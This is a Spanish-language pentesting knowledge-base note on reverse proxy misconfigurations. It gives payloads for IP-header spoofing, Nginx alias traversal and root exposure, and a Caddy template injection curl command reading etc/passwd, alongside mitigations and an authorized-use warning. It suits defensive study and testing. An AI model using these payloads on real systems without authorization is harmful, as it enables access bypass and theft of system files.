---
tags:
  - seguridad-web
  - owasp
  - reverse-proxy
aliases:
  - Reverse Proxy mal configurado
  - Reverse Proxy Misconfigurations
---

# Reverse Proxy mal configurado

**Un reverse proxy** se sitúa entre los clientes y los servidores back-end reenviando peticiones. Configurarlo mal (controles de acceso flojos, `proxy_pass` sin sanear, confianza ciega en cabeceras del cliente) expone recursos internos, traversal o accesos no autorizados.

> [!warning] Uso autorizado
> Técnicas para pruebas en sistemas propios o con autorización explícita. Ver [[📜 Fuentes y Licencias]].

## ¿Cómo funciona?
El proxy decide a qué back-end enrutar y qué cabeceras añadir o respetar. Los fallos típicos:

- **Confiar en cabeceras controlables por el cliente** (`X-Forwarded-For`, `X-Real-IP`, `True-Client-IP`) para autenticación o filtrado por IP.
- **Reglas de `location` ambiguas** en Nginx que permiten salir del directorio previsto (alias traversal).
- **Inyección de plantillas** en servidores como Caddy que evalúan datos del cliente.

## Detección y pruebas
- Analiza la config con **Gixy** (o **Gixy-Next**); busca alias traversal con **Kyubi**.
- Prueba a sobreescribir cabeceras de IP para saltar restricciones:

```http
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
```

- Usa **bypass-url-parser** contra endpoints que devuelven 40X.

## Explotación / payloads

**Off-by-slash en Nginx** — un `alias` con `location` sin barra final permite traversal:

```nginx
location /styles {
  alias /path/css/;
}
```

```
GET /styles../secret.txt   ->  /path/css/../secret.txt  ->  /path/secret.txt
```

**Missing root location** — sin `location /` el `root` global expone ficheros:

```nginx
server {
  root /etc/nginx;
  location /hello.txt { ... }
}
```

```
GET /nginx.conf   ->  /etc/nginx/nginx.conf
```

**Caddy — inyección de plantillas** (directiva `templates` evaluando una cabecera):

```bash
curl -H 'Referer: {{readFile "etc/passwd"}}' http://localhost/
```

| Payload | Descripción |
| --- | --- |
| `{{env "VAR"}}` | Lee variable de entorno |
| `{{listFiles "/"}}` | Lista ficheros de un directorio |
| `{{readFile "ruta"}}` | Lee un fichero |

## Mitigación
- **Nunca confíes en `X-Forwarded-For` / `X-Real-IP` / `True-Client-IP`** del cliente: sobreescríbelas en el proxy (`proxy_set_header X-Forwarded-For $remote_addr;`) y usa solo la IP real de conexión para controles.
- En Nginx, cuida las barras finales en `location`/`alias`; define siempre un `location /` explícito y evita `root` apuntando a directorios sensibles.
- En Caddy, no apliques `templates` sobre datos no confiables del cliente.
- Aplica menor privilegio y segmentación entre proxy y back-end.

## Herramientas
- **Gixy / Gixy-Next** — análisis estático de configs de Nginx.
- **Kyubi** — detección de alias traversal en Nginx.
- **bypass-url-parser** — prueba bypasses de URL contra páginas 40X.

---
🔗 Relacionado: [[SSRF (Server-Side Request Forgery)]] · [[HTTP Request Smuggling]] · [[Virtual Hosts (vhost enumeration)]] · [[Path Traversal]]
📚 Fuente: [PayloadsAllTheThings — Reverse Proxy Misconfigurations](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Reverse%20Proxy%20Misconfigurations) (MIT, © Swissky)
